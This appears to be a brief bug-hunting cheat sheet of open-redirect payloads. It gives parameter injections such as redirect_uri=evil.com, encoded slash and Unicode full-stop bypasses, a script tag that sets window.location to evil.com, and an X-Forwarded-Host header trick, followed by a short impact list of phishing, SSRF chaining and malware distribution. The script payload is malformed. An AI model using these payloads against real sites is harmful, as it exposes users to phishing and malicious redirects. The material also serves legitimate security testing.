# open redirect


1 - payload: {evil.com} 


===>>> example: site.com/.../redirect_uri=evil.com/...

===>>> example: site.com/.../next_url=evil.com/...

===>>> example: ===>>> example: site.com/.../returnurl=http://evil.com

2 - payload: {///%5Cevil.com/} 


===>>> example: site.com///%5Cevil.com/ 

3 - payload:  </script>window.location"http://evil.com"</script>


===>>> example: search box : injection

4 - payload: {bing.com}


===>>> example: ===>>> url ===>>> X-forwarded-host: bing.com

5 - payload: {%E3%80%82}


===>>> example: ===>>> https://20.44.36.49//google%E3%80%82com





==================================================================


## impact:
- an attacker can do phishing with legitimate users
-  they can also chain this with SSRF
-  reputation loss, money loss
-  malware distribution
  
